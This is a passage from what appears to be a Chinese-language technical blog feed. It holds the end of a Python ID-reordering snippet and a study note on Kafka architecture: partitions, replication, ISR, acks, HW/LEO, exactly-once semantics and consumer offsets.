class="line"><span class="function"><span class="keyword">def</span> <span class="title">id_sequence</span><span class="params">(from_id)</span>:</span></span><br><span class="line">    i = from_id</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">yield</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reorder</span><span class="params">(online_max_id, gap, data)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param online_max_id: 线上表的最大ID</span></span><br><span class="line"><span class="string">    :param gap: 两个ID段的间隔</span></span><br><span class="line"><span class="string">    :param data: 待排序的数据</span></span><br><span class="line"><span class="string">            [(10020, datetime(2019,9,18,23,45,56)), (10031, datetime(2019,9,18,23,46,56))]</span></span><br><span class="line"><span class="string">    :return: 新ID</span></span><br><span class="line"><span class="string">            [(10020, datetime(2019,9,18,23,45,56), 100001), (10031, datetime(2019,9,18,23,46,56), 100002)]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># 计算需要分多少个段</span></span><br><span class="line">    seg = [id_sequence(i * (online_max_id + gap)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, ceil(len(data) / online_max_id) + <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">return</span> [(*d, next(seg[randint(<span class="number">0</span>, len(seg) - <span class="number">1</span>)])) <span class="keyword">for</span> d <span class="keyword">in</span> sorted(data, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seg = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_reorder_seg</span><span class="params">(online_max_id, gap, ids)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    根据已分段重排的ID，重新初始化seg，用于继续生成随机ID。</span></span><br><span class="line"><span class="string">    :param online_max_id: 在重排时使用的online_max_id</span></span><br><span class="line"><span class="string">    :param gap: 在重排时使用的gap</span></span><br><span class="line"><span class="string">    :param ids: 当前的所有ID</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">global</span> seg</span><br><span class="line">    sorted_id = sorted([i <span class="keyword">for</span> i <span class="keyword">in</span> ids <span class="keyword">if</span> i &gt;= (online_max_id + gap)])</span><br><span class="line"></span><br><span class="line">    current = sorted_id[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sorted_id:</span><br><span class="line">        <span class="keyword">if</span> current != i:</span><br><span class="line">            seg.append(id_sequence(current - <span class="number">1</span>))</span><br><span class="line">            current = i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_id</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> seg</span><br><span class="line">    <span class="keyword">return</span> next(seg[randint(<span class="number">0</span>, len(seg) - <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法：</span></span><br><span class="line"><span class="comment"># init_reorder_seg(100, 10, [i for i in range(10)])</span></span><br><span class="line"><span class="comment"># for i in range(100):</span></span><br><span class="line"><span class="comment">#     get_id()</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kafka知识梳理</title>
      <link href="2023/04/16/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
      <url>2023/04/16/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Kafka知识梳理"><a href="#Kafka知识梳理" class="headerlink" title="Kafka知识梳理"></a>Kafka知识梳理</h1><h2 id="一：介绍"><a href="#一：介绍" class="headerlink" title="一：介绍"></a>一：介绍</h2><p>什么是消息队列？</p><p>消息队列是一个使用队列来通信的组件 但日常所说的消息队列通常指 消息中间件（中间件不仅仅是解决通信的问题）</p><h2 id="二：为什么需要消息队列"><a href="#二：为什么需要消息队列" class="headerlink" title="二：为什么需要消息队列"></a>二：为什么需要消息队列</h2><p>需要有一个「东西」来解耦服务之间的关系、控制资源合理合时的使用以及缓冲流量洪峰等等。</p><p>消息队列就应运而生了。它常用来实现：<strong>异步处理、服务解耦、流量控制</strong>。</p><h3 id="①-异步处理"><a href="#①-异步处理" class="headerlink" title="① 异步处理"></a>① 异步处理</h3><p>随着公司的发展你会发现项目的请求链路会越来越长，例如刚开始的电商项目，可以就是粗暴的扣库存、下单。慢慢地又加上积分服务、短信服务等。这一路同步调用下来客户可能等急了，这时候就是消息队列登场的好时机。</p><p>调用链路长、响应就慢了，并且相对于扣库存和下单，积分和短信没必要这么的 “及时”。因此只需要在下单结束那个流程，扔个消息到消息队列中就可以直接返回响应了。而且积分服务和短信服务可以并行的消费这条消息。</p><p>可以看出<strong>消息队列可以减少请求的等待，还能让服务异步并发处理</strong>，提升系统总体性能。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86.png" alt="img"></p><h3 id="②-服务解耦"><a href="#②-服务解耦" class="headerlink" title="② 服务解耦"></a>② 服务解耦</h3><p>上面我们说到加了积分服务和短信服务，这时候可能又要来个营销服务，之后领导又说想做个大数据，又来个数据分析服务等等。可以发现订单的下游系统在不断的扩充，为了迎合这些下游系统订单服务需要经常地修改，任何一个下游系统接口的变更可能都会影响到订单服务，这订单服务组可疯了，<strong>真 ·「核心」项目组</strong>。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/640.png" alt="img"></p><p>所以一般会选用消息队列来解决系统之间耦合的问题，订单服务把订单相关消息塞到消息队列中，下游系统谁要谁就订阅这个主题。这样订单服务就解放啦！</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E6%9C%8D%E5%8A%A1%E8%A7%A3%E8%80%A6.png" alt="img"></p><h3 id="③-流量控制"><a href="#③-流量控制" class="headerlink" title="③ 流量控制"></a>③ 流量控制</h3><p>后端服务相对而言都是比较「弱」的，因为业务较重，处理时间较长。像一些例如秒杀活动爆发式流量打过来可能就顶不住了。因此需要引入一个中间件来做缓冲，消息队列再适合不过了。</p><p>1）网关的请求先放入消息队列中，后端服务尽自己最大能力去消息队列中消费请求。超时的请求可以直接返回错误。</p><p>2）当然还有一些服务特别是某些后台任务，不需要及时地响应，并且业务处理复杂且流程长，那么过来的请求先放入消息队列中，后端服务按照自己的节奏处理。</p><p>上面两种情况分别对应着生产者生产过快和消费者消费过慢两种情况，消息队列都能在其中发挥很好的缓冲效果。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6.png" alt="img"></p><h3 id="④-注意："><a href="#④-注意：" class="headerlink" title="④ 注意："></a>④ 注意：</h3><p>引入消息队列固然有以上的好处，但是多引入一个中间件系统的稳定性就下降一层，运维的难度抬高一层。因此要<strong>权衡利弊</strong>，<strong>系统是演进的</strong>。</p><h2 id="三：消息队列基本概念"><a href="#三：消息队列基本概念" class="headerlink" title="三：消息队列基本概念"></a>三：消息队列基本概念</h2><p>消息队列的两种模型：队列模型和发布/订阅模型。</p><h3 id="①-队列模型"><a href="#①-队列模型" class="headerlink" title="① 队列模型"></a>① 队列模型</h3><p>生产者往某个队列里面发送消息，一个队列可以存储多个生产者的消息，一个队列也可以有多个消费者， 但是<strong>消费者之间是竞争关系，即每条消息只能被一个消费者消费</strong>。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E9%98%9F%E5%88%97%E6%A8%A1%E5%9E%8B.png" alt="img"></p><h3 id="②-发布-订阅模型"><a href="#②-发布-订阅模型" class="headerlink" title="② 发布/订阅模型"></a>② 发布/订阅模型</h3><p>为了解决一条消息能被多个消费者消费的问题，发布/订阅模型就来了。该模型是将消息发往一个Topic即主题中，所有订阅了这个 Topic 的订阅者都能消费这条消息。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%9E%8B.png" alt="img"></p><h3 id="③-两个模型之间的区别："><a href="#③-两个模型之间的区别：" class="headerlink" title="③ 两个模型之间的区别："></a>③ 两个模型之间的区别：</h3><p>发布/订阅模型等于我们都加入了一个群聊中，我发一条消息，加入了这个群聊的人都能收到这条消息。</p><p>队列模型就是一对一聊天，我发给你的消息，只能在你的聊天窗口弹出，是不可能弹出到别人的聊天窗口中的。</p><p>一对一聊天对每个人都发同样的消息不就也实现了一条消息被多个人消费了嘛</p><p>通过多队列全量存储相同的消息，即数据的冗余可以实现一条消息被多个消费者消费。RabbitMQ 就是采用队列模型，通过 Exchange 模块来将消息发送至多个队列，解决一条消息需要被多个消费者消费问题。</p><h3 id="④-小结："><a href="#④-小结：" class="headerlink" title="④ 小结："></a>④ 小结：</h3><p>一： 队列模型：每条消息只能被一个消费者消费。（<strong>队列模型也可以通过消息全量存储至多个队列来解决一条消息被多个消费者消费问题，但是会有数据的冗余</strong>）</p><p>发布/订阅模型：一条消息可以被多个消费者消费。</p><p>二：发布/订阅模型兼容队列模型，即只有一个消费者的情况下和队列模型基本一致。</p><p>三：RabbitMQ 采用队列模型，RocketMQ和Kafka 采用发布/订阅模型。</p><h2 id="四：Kafka基础架构"><a href="#四：Kafka基础架构" class="headerlink" title="四：Kafka基础架构"></a>四：Kafka基础架构</h2><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/Kafka%E5%9F%BA%E7%A1%80%E6%9E%B6%E6%9E%84.png" alt="img"></p><p><strong>1）</strong> <strong>Producer</strong> ： 消息生产者，就是向 kafka broker 发消息的客户端；<br><strong>2）</strong> <strong>Consumer</strong> ： 消息消费者，向 kafka broker 取消息的客户端；<br><strong>3）</strong> <strong>Consumer Group （CG）</strong>： 消费者组，由多个 consumer 组成。 消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费；消费者组之间互不影响。 所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者。<br><strong>4） Broker</strong> ： 一台 kafka 服务器就是一个 broker。一个集群由多个 broker 组成。一个 broker可以容纳多个 topic。<br><strong>5） Topic</strong> ： 可以理解为一个队列， 生产者和消费者面向的都是一个 topic；<br><strong>6） Partition</strong>： 为了实现扩展性，一个非常大的 topic 可以分布到多个 broker（即服务器）上，一个 topic 可以分为多个 partition，每个 partition 是一个有序的队列；<br><strong>7） Replica</strong>： 副本，为保证集群中的某个节点发生故障时， 该节点上的 partition 数据不丢失，且 kafka 仍然够继续工作， kafka 提供了副本机制，一个 topic 的每个分区都有若干个副本，一个 leader 和若干个 follower。<br><strong>8） leader</strong>： 每个分区多个副本的“主”，生产者发送数据的对象，以及消费者消费数据的对象都是 leader。<br><strong>9） follower</strong>： 每个分区多个副本中的“从”，实时从 leader 中同步数据，保持和 leader 数据的同步。 leader 发生故障时，某个 follower 会成为新的 follower。</p><h3 id="①-流程"><a href="#①-流程" class="headerlink" title="① 流程"></a>① 流程</h3><p>消息从Producer发往Broker，Broker将消息存储至本地，然后Consumer从Broker拉取消息，或者Broker推送消息至Consumer，最后消费。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E6%B5%81%E7%A8%8B.png" alt="img"></p><h3 id="②-Topic"><a href="#②-Topic" class="headerlink" title="② Topic"></a>② Topic</h3><p><strong>Kafka 中消息是以 topic 进行分类的</strong>，生产者生产消息，消费者消费消息，都是面向 topic 的。</p><p>Topic是逻辑上的概念，存放在Broker上，实际上同一个Broker存放着不同的topic。</p><h3 id="③-Partition分区"><a href="#③-Partition分区" class="headerlink" title="③ Partition分区"></a>③ Partition分区</h3><p>1）为了提高topic负载能力和并发度：</p><p>引入<strong>分区</strong>的概念，即<strong>生产者的数据是轮询发送给不同Broker中的相同topic</strong>。</p><p>注：RocketMQ中叫队列，Kafka叫分区，本质一样。</p><p>2）副本</p><p>topic每个Partition都有N个副本，架构图中是2个，创建的时候可以指定。</p><p>主为leader，副为follower。消费者和生产者都是联系leader，follower仅仅为备份作用。</p><p>leader和follower 不在同一台机器上且副本数一定小于Broker的数量。</p><p>3）消费者组</p><p>多个消费者放在一个组，<strong>同一个消费者组中的不同消费者不能够同时消费同一个分区中的数据</strong>。</p><p>简单点说：组内每个消费者负责消费不同分区的相同topic数据。</p><p>最好并发条件：消费者组中个数=分区数。</p><p>3.1）如何实现消费者重启后的断点续传功能</p><p>记录消费的位置。</p><p>Kafka 0.9版本之前，在zookeeper存放offset，记录偏移量。</p><p>在0.9版本之后，则存放回了Kafka系统创建的topic中（默认分区50个，轮询方式存储， __consumer_offsets-? ）</p><p><strong>原因：</strong>消费者主动拉取数据，速度快，联系Kafka 还要联系zk（联系频繁，效率不高）</p><p>3.2）Kafka中副本和HDFS副本的区别</p><p>HDFS中的副本是指最大副本数，会随着机器的扩展自动增加。</p><p>Kafka中设置副本数大于Broker数，则会报错。指的是当前副本数。</p><h2 id="五：kafka文件存储机制"><a href="#五：kafka文件存储机制" class="headerlink" title="五：kafka文件存储机制"></a>五：kafka文件存储机制</h2><p>kafka中的消息是以topic分类的。不论是生产者还是消费者，都是面向topic。</p><p><strong>但是</strong></p><p><strong>topic是逻辑上的概念，而patition是物理上的概念</strong></p><p>每一个patition文件对应着一个log文件（对，你没看错，不过这个log并非日志文件，而是存放producer生产的数据）。</p><p>Produce生产的消息会不断追加到log文件末尾，但是随着消息的不断增多，会出现log文件过大导致数据定位效率低下的问题。</p><p>于是Kafka采取了分片和索引机制，如下图</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6.png" alt="img"></p><p>将每个 partition 分为多个 segment（分片）。 每个 segment对应两个文件——“.index”文件和“.log”文件。</p><p>1）“.index”文件存储大量的索引信息</p><p>2）“.log”文件存储大量的数据，索引文件中的元数据指向对应数据文件中 message 的物理偏移地址。</p><p>这些文件位于一个文件夹下， 该文件夹的命名规则为： topic 名称+分区序号。</p><p>例如： 例如， first 这个 topic 有三个分区，则其对应的文件夹为 first-0,first-1,first-2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">COPY00000000000000000000.index</span><br><span class="line">00000000000000000000.log</span><br><span class="line">00000000000000170410.index</span><br><span class="line">00000000000000170410.log</span><br><span class="line">00000000000000239430.index</span><br><span class="line">00000000000000239430.log</span><br></pre></td></tr></table></figure><p><strong>注</strong>：log文件默认存放7天 ，maximum size of a log segment 默认最大1G 到了该大小会产生新的文件。</p><p>产生的新文件命名：接着上一个最大的偏移量 +1</p><p><strong>补</strong>：数值最大为64位long大小，19位数字字符长度，没有数字用0填充</p><p>message查找过程：</p><p> 1）二分查找 ，位index文件（因为index文件每条数据大小固定，所以可以快速定位）</p><p> 2）在index文件 中找到偏移量和数据的大小 在log文件中 定位到偏移量，取出相同的大小</p><h2 id="六：Kafka的生产者"><a href="#六：Kafka的生产者" class="headerlink" title="六：Kafka的生产者"></a>六：Kafka的生产者</h2><h3 id="①-分区策略"><a href="#①-分区策略" class="headerlink" title="① 分区策略"></a>① 分区策略</h3><h4 id="1）分区的原因："><a href="#1）分区的原因：" class="headerlink" title="1）分区的原因："></a>1）分区的原因：</h4><h5 id="（1）方便在集群中扩展"><a href="#（1）方便在集群中扩展" class="headerlink" title="（1）方便在集群中扩展"></a>（1）方便在集群中扩展</h5><p>每个partition可以通过调整以适应它所在的机器，而一个 topic又可以有多个 Partition 组成，因此整个集群就可以适应任意大小的数据了；</p><h5 id="（2）-可以提高并发"><a href="#（2）-可以提高并发" class="headerlink" title="（2） 可以提高并发"></a>（2） 可以提高并发</h5><p>因为可以以 Partition 为单位读写了</p><h4 id="2）分区原则"><a href="#2）分区原则" class="headerlink" title="2）分区原则"></a>2）分区原则</h4><p>（1）指明 partition的情况下，直接将指明的值直接作为 partiton值；</p><p>（2）没有指明partition值但有 key 的情况下，将 key的hash值与topic的partition数进行取余得到 partition 值；</p><p>（3）既没有 partition 值又没有 key 值的情况下，第一次调用时随机生成一个整数（后面每次调用在这个整数上自增），将这个值与 topic 可用的 partition 总数取余得到 partition值，也就是常说的 round-robin 算法（轮询）</p><h3 id="②-保证数据可靠性"><a href="#②-保证数据可靠性" class="headerlink" title="② 保证数据可靠性"></a>② 保证数据可靠性</h3><h4 id="1-副本数据同步策略"><a href="#1-副本数据同步策略" class="headerlink" title="(1)副本数据同步策略"></a>(1)副本数据同步策略</h4><p>为保证 producer 发送的数据，能可靠的发送到指定的 topic,topic 的每个 partition 收到producer 发送的数据后,都需要向 producer 发送 ack（acknowledgement 确认收到），如果producer 收到 ack， 就会进行下一轮的发送，否则重新发送数据。</p><p>问题：</p><p> 1：何时发送ack？</p><p> 2：多少个follower同步完成之后发送ack？</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/%E7%94%9F%E4%BA%A7%E8%80%85%E4%B8%8EKafka%E7%9A%84%E5%89%AF%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E7%AD%96%E7%95%A5.png" alt="img"></p><h4 id="2-ISR"><a href="#2-ISR" class="headerlink" title="(2)ISR"></a>(2)ISR</h4><p> 采用上图第二种方案，如果：leader收到数据，众多follower中的一个，因为故障，长时间不能同步，就会陷入无限等待的死循环中，如何解决这个问题呢？</p><h5 id="1：follower挂了："><a href="#1：follower挂了：" class="headerlink" title="1：follower挂了："></a>1：follower挂了：</h5><p> Leader 维护了一个动态的 in-sync replica set (ISR)，意为和leader保持同步的 follower 集合。</p><p> 当ISR中的follower 完成数据的同步之后，leader就会给 follower 发送 ack。</p><p> 如果follower长 时 间 未 向 leader 同 步 数 据，则该follower将 被踢出ISR ，该时间阈值由 replica.lag.time.max.ms 参数设定。</p><h5 id="2：leader挂了"><a href="#2：leader挂了" class="headerlink" title="2：leader挂了"></a>2：leader挂了</h5><p> Leader 发生故障之后，就会通过Zookeeper中的Controller实现leader选举，从ISR中选举新的 leader。</p><h5 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h5><p>如何确定一个副本在ISR列表中：</p><p>（1）和leader的时间差。 配置参数rerplica.lag.time.max.ms=10000 单位ms。</p><p>（2）和leader的信息条数差。配置参数rerplica.lag.max.messages=4000 单位条。</p><p><strong>BUT 事情没有那么简单</strong></p><p>高版本的Kafka 去除了条数的限制，Because</p><p>① 生产者是批量发送数据的(batch)</p><p>② ISR在内存中</p><p>③ Kafka将ISR写入zk中进行维护</p><p>当batch &gt; max.messages 批次发给leader，写完后跟所有的follower的数据跟leader差距都是 max.messages 会剔除ISR。</p><p><strong>然鹅</strong></p><p>很多机器很快又拉取数据完成同步，又被拉入ISR，会导致频繁的操作ISR和ZK。</p><h3 id="（3）ack-应答机制"><a href="#（3）ack-应答机制" class="headerlink" title="（3）ack 应答机制"></a>（3）ack 应答机制</h3><p><strong>根据数据的可靠性要求决定</strong></p><p>能够容忍数据的少量丢失，所以没必要等 ISR 中的 follower 全部接收成功。</p><p>acks 参数配置：</p><table><thead><tr><th>0</th><th>不等待 broker 的 ack ： broker 一接收到还没有写入磁盘就已经返回，当 broker 故障时有可能丢失数据；</th></tr></thead><tbody><tr><td><strong>1</strong></td><td><strong>只等待leader返回 ： 在 follower 同步成功之前 leader 故障，那么将会丢失数据</strong></td></tr><tr><td><strong>-1</strong></td><td><strong>producer 等待 broker 的 ack， partition 的 leader 和 follower 全部落盘成功后才返回 ack。但是如果在 follower 同步完成后， broker 发送 ack 之前， leader 发生故障，那么会造成数据重复</strong></td></tr></tbody></table><p><strong>注</strong>：ack=-1还可能存在一种问题：就是同步时间较长，ISR中只剩下leader，这样子就退化到ack=1的情况，容易造成数据的丢失。</p><h4 id="思考：-1"><a href="#思考：-1" class="headerlink" title="思考："></a>思考：</h4><p>当leader1同步follower的时候，还<strong>未</strong>同步完成<strong>任何</strong>follower，但是leader1挂掉了。选数据量最大的follower了一个新的leader2，但是leader1重启好了，造成了leader和follower数据存的数据都不一样。如何保证数据的一致性呢？</p><p><strong>见 七：HW和LEO</strong></p><h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p>ack保证的是生产者消息的不丢失。</p><h2 id="七：HW-和LEO"><a href="#七：HW-和LEO" class="headerlink" title="七：HW 和LEO"></a>七：HW 和LEO</h2><p>HW：高水位，所有副本中最小的LEO（ISR队列中最小的LEO）</p><p>LEO：log end offset，每个副本（包括leader）的最后一个offset。</p><p><img src="https://huangjun1996.gitee.io/2020/07/27/Kafka%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/HW.png" alt="img"></p><h3 id="1-follower-故障"><a href="#1-follower-故障" class="headerlink" title="(1) follower 故障"></a>(1) follower 故障</h3><p>① follower 发生故障后会被临时踢出 ISR</p><p>② 待该 follower 恢复后，follower 会读取本地磁盘记录的上次的 HW，并将 log 文件高于 HW 的部分截取掉，从 HW 开始向 leader 进行同步。</p><p>③ 等该 follower 的 LEO 大于等于该 Partition 的 HW，即 follower 追上 leader 之后，就可以重新加入 ISR 了。</p><h3 id="2-leader-故障"><a href="#2-leader-故障" class="headerlink" title="(2) leader 故障"></a>(2) leader 故障</h3><p>① leader 发生故障之后，会从 ISR 中选出一个新的 leader。</p><p>② 之后，为保证多个副本之间的数据一致性， 其余的 follower 会先将各自的 log 文件高于 HW 的部分截掉</p><p>③ 然后从新的 leader同步数据</p><p><strong>注</strong>：截取的时候，leader自己不会被截</p><h3 id="3-小结"><a href="#3-小结" class="headerlink" title="(3)小结"></a>(3)小结</h3><h4 id="1）两个一致性"><a href="#1）两个一致性" class="headerlink" title="1）两个一致性"></a>1）两个一致性</h4><p>结合六种的思考</p><h5 id="①-存储一致性："><a href="#①-存储一致性：" class="headerlink" title="① 存储一致性："></a>① 存储一致性：</h5><p>出现上述问题时，未返回ack，导致生产者重新发送了数据。原来的leader里面是10条，新的leader是9条，要对多余的数据进行处理。</p><h5 id="②-消费一致性"><a href="#②-消费一致性" class="headerlink" title="② 消费一致性"></a>② 消费一致性</h5><p>HW和LEO</p><h4 id="2）HW、LEO"><a href="#2）HW、LEO" class="headerlink" title="2）HW、LEO"></a>2）HW、LEO</h4><p>HW和LEO这只能保证副本之间的数据一致性，并不能保证数据不丢失或者不重复。</p><h2 id="八：Exactly-Once-语义"><a href="#八：Exactly-Once-语义" class="headerlink" title="八：Exactly Once 语义"></a>八：Exactly Once 语义</h2><h3 id="①-At-Least-Once"><a href="#①-At-Least-Once" class="headerlink" title="① At Least Once"></a>① At Least Once</h3><p>将服务器的 ACK 级别设置为-1，可以保证 Producer 到 Server 之间不会丢失数据，即 At<br>Least Once 语义。</p><p>At Least Once 可以保证数据不丢失，但是不能保证数据不重复 。</p><h3 id="②-At-Most-Once"><a href="#②-At-Most-Once" class="headerlink" title="② At Most Once"></a>② At Most Once</h3><p>将服务器 ACK 级别设置为 0，可以保证生产者每条消息只会被<br>发送一次，即 At Most Once 语义。</p><p>At Least Once 可以保证数据不重复，但是不能保证数据不丢失。</p><h3 id="③-幂等性"><a href="#③-幂等性" class="headerlink" title="③ 幂等性"></a>③ 幂等性</h3><p>对于一些非常重要的信息，比如说交易数据，下游数据消费者要求数据既不重复也不丢失，即 Exactly Once 语义</p><h4 id="1）0-11-版本以前"><a href="#1）0-11-版本以前" class="headerlink" title="1）0.11 版本以前"></a>1）0.11 版本以前</h4><p>0.11 版本以前的 Kafka，对此是无能为力的，只能保证数据不丢失 ，再在下游消费者对数据做全局<br>去重。对于多个下游应用的情况，每个都需要单独做全局去重，这就对性能造成了很大影响。</p><h4 id="2）0-11-版本之后"><a href="#2）0-11-版本之后" class="headerlink" title="2）0.11 版本之后"></a>2）0.11 版本之后</h4><p>幂等性 ：指 Producer 不论向 Server 发送多少次重复数据， Server 端都只会持久化一条。</p><p>幂等性结合 At Least Once 语义，就构成了 Kafka 的 Exactly Once 语义</p><p>要启用幂等性，只需要将 Producer 的参数中 *<em>enable.idompotence 设置为 true 即可 *</em></p><h3 id="④-幂等性实现原理："><a href="#④-幂等性实现原理：" class="headerlink" title="④ 幂等性实现原理："></a>④ 幂等性实现原理：</h3><p>1：将原来下游需要做的去重放在了数据上游。</p><p>2：开启幂等性的 Producer在初始化的时候会被分配一个 PID，发往同一 Partition 的消息会附带 Sequence Number。</p><p>3：而Broker 端会对&lt;PID, Partition, SeqNumber&gt;做缓存，当具有相同主键的消息提交时， Broker只会持久化一条。</p><p><strong>注</strong>：但是 PID 重启就会变化，同时不同的 Partition 也具有不同主键，所以幂等性无法保证跨分区跨会话的 Exactly Once。</p><h2 id="九：kafka消费者"><a href="#九：kafka消费者" class="headerlink" title="九：kafka消费者"></a>九：kafka消费者</h2><h2 id="①-消费方式"><a href="#①-消费方式" class="headerlink" title="① 消费方式"></a>① 消费方式</h2><p>1）consumer 采用 pull（拉） 模式从 broker 中读取数据。</p><p>push（推）模式很难适应消费速率不同的消费者，因为消息发送速率是由 broker 决定的，很容易造成 consumer 来不及处理消息 。</p><p>2）pull 模式不足之处：如果 kafka 没有数据，消费者可能会陷入循环中， 一直返回空数<br>据。</p><p>解决： Kafka 的消费者在消费数据时会传入一个时长参数 timeout，如果当前没有数据可供消费， consumer 会等待一段时间之后再返回，这段时长即为 timeout。</p><h2 id="②-分区分配策略"><a href="#②-分区分配策略" class="headerlink" title="② 分区分配策略"></a>② 分区分配策略</h2><p>一个 consumer group 中有多个 consumer，一个 topic 有多个 partition，所以必然会涉及到 partition 的分配问题，即确定那个 partition 由哪个 consumer 来消费。</p><p>同一个消费者组中的消费者不能同时消费一个分区。却可以同时消费一个toptic。</p><p>Kafka 有两种分配策略，一是 RoundRobin，一是 Range。</p><h3 id="1）-RoundRobin"><a href="#1）-RoundRobin" class="headerlink" title="1） RoundRobin"></a>1） RoundRobin</h3><p>把当前所有主题当作一个整体，用TopicAndPartition()类 一个分区看做一个对象，根据对象的hash值排序 ，排序完成后再把结果当做整体轮询</p><p>优点：每个消费者之间数据的差值最多1个</p><p>缺点：a消费t1，b消费t2，把t1和t2当成一个整体则容易消费错误主题。</p><p><strong>条件</strong>：当前主题必须是一样的</p><h3 id="2）Range-（默认）"><a href="#2）Range-（默认）" class="headerlink" title="2）Range （默认）"></a>2）Range （默认）</h3><p>先看订阅的人，再看组的关系</p><p>组：a，b</p><p>T2(0,1,2)主题 只有b订阅 三个分区全部给b，*<em>组中的消费者也会进行排序 *</em></p><p>缺点：随着分区越来越多，消费者之间的分区数量差距越来越大。</p><h3 id="3）如何选择"><a href="#3）如何选择" class="headerlink" title="3）如何选择"></a>3）如何选择</h3><p>a消费t1，b消费t2 使用 Range</p><p>如果t1和t2都订阅了，最好使用RoundRobin –均匀</p><h3 id="4）触发策略执行时机"><a href="#4）触发策略执行时机" class="headerlink" title="4）触发策略执行时机"></a>4）触发策略执行时机</h3><p>① 启动消费者的时候</p><p>② 组中消费者个数变动 会激发 分区重新分配</p><p>③ 存在消费者分配不到情况，但是一定会重新分配</p><h2 id="十：消费者offset的维护"><a href="#十：消费者offset的维护" class="headerlink" title="十：消费者offset的维护"></a>十：消费者offset的维护</h2><p>同一个组中，新加入消费者的时候：会重新分配分区，接着之前的数据消费</p><p>按消费者组+主题+分区的顺序保存offset</p><h3 id="（1）Kafka-0-9-版本之前"><a href="#（1）Kafka-0-9-版本之前" class="headerlink" title="（1）Kafka 0.9 版本之前"></a>（1）Kafka 0.9 版本之前</h3><p>consumer 默认将 offset 保存在 Zookeeper 中，其中controller 节点抢占资源的方式选出。哪个broker先注册就是谁，跟小弟资源共享。专门派来跟zk写数据。</p><p>进入offsets节点 能看到主题，进入分区信息，get下能看到offset。默认1s提交</p><h3 id="（2）0-9-版本开始"><a href="#（2）0-9-版本开始" class="headerlink" title="（2）0.9 版本开始"></a>（2）0.9 版本开始</h3><p>consumer 默认将 offset 保存在 Kafka 一个内置的 topic 中，该 topic 为__consumer_offsets。</p><h4 id="①-修改配置文件"><a href="#①-修改配置文件" class="headerlink" title="① 修改配置文件"></a>① 修改配置文件</h4><p>consumer.properties中的</p><p>exclude.internal.topics=false 显示系统内部topic</p><h4 id="②-格式化"><a href="#②-格式化" class="headerlink" title="② 格式化"></a>② 格式化</h4><p>格式化系统topic数据 再读取</p><p>offerset–&gt; 消费者组G+主题T+分区 0 2</p><p>offerset–&gt; 消费者组G+主题T+分区1 1</p><p>三条数据，轮询，所以是1+2</p><p>consumer 将offset写入到系统的topic 中，相当于生产者。</p><p><strong>offset：消费者组G+主题T+分区P，从0开始计算。组中的其他消费者 拿着组名 就能取到offset</strong></p><h2 id="十一：Kafka高效读写数据"><a 